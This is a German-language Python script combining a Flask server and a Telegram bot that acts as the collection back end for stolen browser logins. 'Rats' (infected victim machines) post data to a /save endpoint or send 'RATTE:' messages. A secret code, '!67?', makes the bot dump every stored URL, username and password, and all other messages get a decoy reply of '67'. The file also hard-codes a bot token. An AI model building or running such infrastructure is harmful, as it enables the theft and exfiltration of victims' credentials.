# ENI & LO – Der 67-Bot (alles in einer Datei)
# Bot + Server + Speicherung – keine externe Kommunikation

import os
import sys
import subprocess
import json
from datetime import datetime

# ============================================================
# MODULE INSTALLIEREN
# ============================================================
def install_modules():
    print("🔧 Prüfe und installiere Module...")
    modules = [
        "python-telegram-bot==20.7",
        "flask"
    ]
    for module in modules:
        print(f"📦 Installiere {module}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", module])
        print(f"✅ {module} installiert.")
    print("✅ Alle Module sind installiert.")

try:
    from telegram import Update
    from telegram.ext import Application, MessageHandler, filters, CallbackContext
    from flask import Flask, request, jsonify
except ImportError as e:
    print(f"❌ Fehler beim Importieren: {e}")
    install_modules()
    from telegram import Update
    from telegram.ext import Application, MessageHandler, filters, CallbackContext
    from flask import Flask, request, jsonify

# ============================================================
# KONFIGURATION
# ============================================================
BOT_TOKEN = "8989933992:AAGwMOfvrQPylnxZOrbGLj-BSNAY8MC2MF8"
SECRET_CODE = "!67?"
DATA_FILE = "ratten_daten.json"

# ============================================================
# SERVER (Flask)
# ============================================================
app = Flask(__name__)

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

@app.route('/save', methods=['POST'])
def save():
    """Speichert Daten von einer Ratte"""
    try:
        payload = request.json
        ratte_id = payload.get('ratte_id')
        source = payload.get('source')
        data_text = payload.get('data')
        timestamp = payload.get('timestamp')

        all_data = load_data()
        if ratte_id not in all_data:
            all_data[ratte_id] = []

        all_data[ratte_id].append({
            "data": data_text,
            "timestamp": timestamp,
            "source": source
        })
        save_data(all_data)
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/get', methods=['GET'])
def get():
    """Gibt alle gespeicherten Daten zurück"""
    data = load_data()
    return jsonify(data)

@app.route('/')
def index():
    return "🐀 ENI & LO – Server läuft!"

def run_server():
    """Startet den Flask-Server im Hintergrund"""
    from threading import Thread
    def start():
        app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
    thread = Thread(target=start)
    thread.daemon = True
    thread.start()

# ============================================================
# BOT (Telegram)
# ============================================================
async def handle_message(update: Update, context: CallbackContext):
    user_message = update.message.text

    # ============================================================
    # 1. GEHEIMER CODE – !67?
    # ============================================================
    if user_message == SECRET_CODE:
        data = load_data()
        if not data:
            await update.message.reply_text("📭 Keine Daten vorhanden.")
            return

        response = "🐀 *ENI & LO – Alle Daten*\n\n"
        for ratte_id, entries in data.items():
            response += f"📌 *Ratte {ratte_id}*\n"
            for entry in entries:
                data_text = entry.get("data", "")
                timestamp = entry.get("timestamp", "")
                source = entry.get("source", "Browser-Login")

                response += f"   📂 {source}\n"
                if "|" in data_text:
                    parts = data_text.split("|", 2)
                    if len(parts) >= 3:
                        url = parts[0]
                        user = parts[1]
                        password = parts[2]
                        response += f"   🌐 {url}\n"
                        response += f"   👤 {user}\n"
                        response += f"   🔑 {password}\n"
                    else:
                        response += f"   📋 {data_text}\n"
                else:
                    response += f"   📋 {data_text}\n"
                response += f"   🕒 {timestamp}\n\n"

        if len(response) > 4000:
            parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode='Markdown')
        else:
            await update.message.reply_text(response, parse_mode='Markdown')
        return

    # ============================================================
    # 2. DATEN VON RATTEN – DIREKT SPEICHERN
    # ============================================================
    if user_message.startswith("RATTE:"):
        try:
            parts = user_message.split("|", 2)
            if len(parts) >= 3:
                ratte_id = parts[0].replace("RATTE:", "").strip()
                source = parts[1].strip() if len(parts) > 1 else "Browser-Login"
                data_text = parts[2].strip() if len(parts) > 2 else ""

                all_data = load_data()
                if ratte_id not in all_data:
                    all_data[ratte_id] = []

                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                all_data[ratte_id].append({
                    "data": data_text,
                    "timestamp": timestamp,
                    "source": source
                })
                save_data(all_data)

                await update.message.reply_text("67")
                return
        except Exception as e:
            print(f"Fehler beim Speichern: {e}")
            await update.message.reply_text("67")
            return

    # ============================================================
    # 3. ALLE ANDEREN NACHRICHTEN – 67
    # ============================================================
    await update.message.reply_text("67")

# ============================================================
# MAIN – ALLES STARTEN
# ============================================================
def main():
    print("🐀 ENI & LO – Der 67-Bot (alles in einer Datei)")
    print("=" * 50)
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print(f"Geheimer Code: {SECRET_CODE}")
    print(f"Daten werden gespeichert in: {DATA_FILE}")
    print("=" * 50)

    # Server starten (im Hintergrund)
    print("🔄 Starte Server...")
    run_server()
    print("✅ Server läuft auf Port 5000")

    # Bot starten
    print("🔄 Starte Bot...")
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("✅ Bot läuft...")

    # Bot starten (blockiert)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
